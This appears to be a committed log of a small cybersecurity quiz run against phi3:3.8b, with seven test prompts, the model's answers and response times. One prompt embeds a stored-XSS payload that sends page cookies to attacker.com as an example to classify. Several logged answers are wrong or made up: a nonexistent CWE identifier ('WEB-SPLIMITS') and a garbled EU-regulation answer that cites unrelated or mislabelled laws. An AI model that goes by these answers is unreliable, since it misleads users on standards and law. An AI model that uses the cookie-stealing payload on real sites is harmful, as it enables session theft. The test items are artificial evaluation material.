@@ -1,0 +1,144 @@
+Cybersecurity Sanity Test Log
+Run Mode: phi3_3_8b
+Initialized: 2025-07-14T14:54:29.050389
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:54:54.568545
+Model: phi3:3.8b
+Category: Basic Definitions - Identification
+Response Time: 25.51 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?
+
+LLM RESPONSE:
+This sentence represents an imperative security policy directive. The primary purpose of this statement in a cybersecurity setting is to mandate that users must provide at least two forms of verification before gaining administrative access on the system, thereby enhancing overall system security and reducing potential unauthorized access risks.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:55:31.394863
+Model: phi3:3.8b
+Category: Frameworks - Application
+Response Time: 36.82 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?
+
+LLM RESPONSE:
+The two core functions of the NIST CSF that a company is demonstrating through their immediate response to contain damage and restore systems using backups after a ransomware attack are "Response" and likely, if they have planned for such an event prior, "Recovery". The Response function includes identifying, analyzing, and containing threats. Recovery involves restoring impaired services or processes from secure storage to return them to normal operation following the mitigation of a threat's impact.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:56:15.838621
+Model: phi3:3.8b
+Category: Security Controls - Identification
+Response Time: 44.44 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?
+
+LLM RESPONSE:
+The specific control within the National Institute of Standards and Technology (NIST) Special Publication 800-53 that directly supports recording all privileged actions in immutable, time-stamped log files is Control AU-2. This pertains to "Audit Logging." The audit logging control ensures the creation of a complete and reliable record or logs containing details about events such as user authentications (logins) performed by privileged users that are crucial for detecting security incidents, complying with regulatory requirements, understanding how systems were used during an event investigation after a security breach.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:56:43.894624
+Model: phi3:3.8b
+Category: Vulnerabilities - Identification
+Response Time: 28.05 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?
+
+LLM RESPONSE:
+The described scenario depicts an XSS (Cross-Site Scripting) attack, specifically a stored or persistent XSS since it resides within the database of comments. Its corresponding Common Weakness Enumeration (CWE) identifier would be WEB-SPLIMITS.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:57:11.545067
+Model: phi3:3.8b
+Category: Threat Modeling - Classification
+Response Time: 27.65 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?
+
+LLM RESPONSE:
+This threat falls under the 'Tampering' category within the STRIDE methodology for identifying security threats in systems design. Tampering occurs when an attacker manipulates data or code, leading potentially to incorrect results and altered system behavior without necessarily having direct access to authorized commands or operations.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:58:28.986348
+Model: phi3:3.8b
+Category: Regulations/Directives - Application
+Response Time: 77.44 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?
+
+LLM RESPONSE:
+The nationwide power grid operator's cyberattack disrupting electricity distribution primarily concerns Regulation (EU) No 958/2013 on jurisdiction and the recognition and enforcement of judgments in civil matters, as it relates to legal proceedings across EU member states. In addition, Directive 2016/680 establishes a framework for national laws that preventatively protect natural persons with regard to the processing of personal data and automated individual decision-making including profiling within the Union (General Data Protection Regulation - GDPR), though this is more pertinent if user privacy was compromised.
+
+
+For the social media company's data breach, it primarily concerns Article 51 of Directive 2004/39 on measures to ensure a high level of personal data protection in the EU internal market that allows supervisory authorities and individuals to lodge complaints against decisions made by public bodies or enterprises (Data Protection Authorities - DPAs) regarding data processing activities. Secondly, GDPR would also be relevant here as it sets out general obligations for the company in relation to personal data breaches.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:58:45.179971
+Model: phi3:3.8b
+Category: Basic Principles - Application
+Response Time: 16.19 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?
+
+LLM RESPONSE:
+Integrity, as it ensures file authenticity and helps detect any unauthorized changes made to the data.
+
+--- End of Test Case ---
+==================================================
+
+--- Run Summary ---
+
+Model: phi3:3.8b
+  - Total Tests: 7
+  - Total Time Spent in LLM Calls: 256.10 seconds
+  - Average Response Time: 36.59 seconds
+
+Total Number of Test Cases Configured: 7
+
+End of Log.
